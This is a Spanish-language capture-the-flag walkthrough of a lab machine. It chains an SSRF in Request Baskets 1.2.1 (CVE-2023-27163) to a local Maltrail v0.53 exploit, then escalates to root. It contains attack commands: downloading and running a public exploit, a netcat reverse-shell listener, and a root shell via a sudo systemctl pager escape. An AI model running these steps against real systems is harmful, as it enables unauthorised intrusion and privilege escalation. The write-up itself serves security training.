La parte importante ya no es solo que exista una web en 55555/tcp, sino que ahora queda identificado el producto y la versión exacta: Request Baskets 1.2.1. Eso cierra la fase de web genérica y permite pasar a una lectura más precisa del caso.

La candidata pública que mejor encaja ahora mismo es CVE-2023-27163. No encaja por intuición, sino por tres señales fuertes juntas: la versión observada es 1.2.1, el endpoint /api/baskets/{name} aparece en la propia interfaz y la documentación oficial del proyecto indica que Request Baskets permite reenviar peticiones entrantes a URLs arbitrarias, exactamente la clase de funcionalidad que da sentido a una SSRF en este producto.

Aun así, hay un matiz clave: la interfaz también muestra que la instancia funciona en restricted mode y que la creación de baskets requiere master token. Por tanto, la vulnerabilidad pública queda muy plausible, pero su aplicabilidad real en esta instancia sigue pendiente de una verificación corta: confirmar si el flujo relevante de creación o configuración de baskets está realmente alcanzable sin ese token, o si la restricción cambia el escenario.

Con lo observado hasta ahora, no parece que la rama principal deba pasar a SSH. SSH sigue siendo secundaria porque no hay usuario ni credencial reutilizable. Tampoco hay todavía base suficiente para convertir el caso en una rama clásica de WEB-AUTH / PANEL: sí existe control por token y una zona de administración, pero la señal dominante ahora no es un flujo de login o perfil, sino una aplicación versionada con una candidata pública muy concreta. La rama operativa principal sigue siendo, por tanto, la web, ya en fase de versionado + candidata pública plausible.

#### Verificación del comportamiento real de autorización

```bash
curl -i http://10.129.32.133:55555/web/baskets
curl -i http://10.129.32.133:55555/api/baskets
curl -i -X OPTIONS http://10.129.32.133:55555/api/baskets/test
curl -s http://10.129.32.133:55555/web | grep -Ei 'restricted|token|api/baskets|Version'
```

Hallazgo dominante en esa fase: panel de administración visible y API con autorización real por token en Request Baskets 1.2.1. Rama principal activa en ese momento: WEB-AUTH / PANEL. Ramas secundarias anotadas: SSH y posible SSRF/localhost como hipótesis subordinada.

#### Acceso a la aplicación web principal

Se accede a `http://10.129.32.133:55555/web`. Tras la creación de la basket, la aplicación devuelve un token asociado y una URL específica de acceso a la basket.

#### Validación de la SSRF en Request Baskets

Para validar la SSRF se configura el reenvío de la basket hacia la IP del atacante. La evidencia observada en el listener confirma la conexión desde la víctima:

```bash
connect to [10.10.15.26] from (UNKNOWN) [10.129.32.133] 45084
GET / HTTP/1.1
Host: 10.10.15.26
User-Agent: curl/7.88.1
Accept: */*
X-Do-Not-Forward: 1
Accept-Encoding: gzip
```

#### Pivote a localhost y acceso inicial

La basket se reconfigura para reenviar a `http://127.0.0.1:80`, permitiendo descubrir Maltrail v0.53. Posteriormente se utiliza una PoC pública para obtener una shell como `puma`.

```bash
curl -s https://www.exploit-db.com/download/51676 > exploit.py
nc -lvnp 4444
python3 exploit.py 10.10.15.26 4444 http://10.129.32.133:55555/v2jmfit
```

La shell recibida confirma el acceso como `puma`, y desde su directorio personal se obtiene `user.txt`.

#### Escalada de privilegios

La revisión de `sudo -l` muestra:

```bash
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Al ejecutar el comando permitido y escapar del paginador con `!/bin/bash`, se obtiene una shell como root.

#### Obtención de root y cierre del caso

Desde `/root` se localiza `root.txt` y se completa la resolución del caso.

---

## 19. Correcciones aplicadas sobre la base reconstruida

No ha sido necesario corregir ninguna absurdidad técnica manifiesta del contenido fuente. Solo se han realizado:

- normalización editorial de encabezados;
- reordenación didáctica de fases;
- integración de explicaciones formativas en el cuerpo principal;
- conservación del contenido base en anexo final.
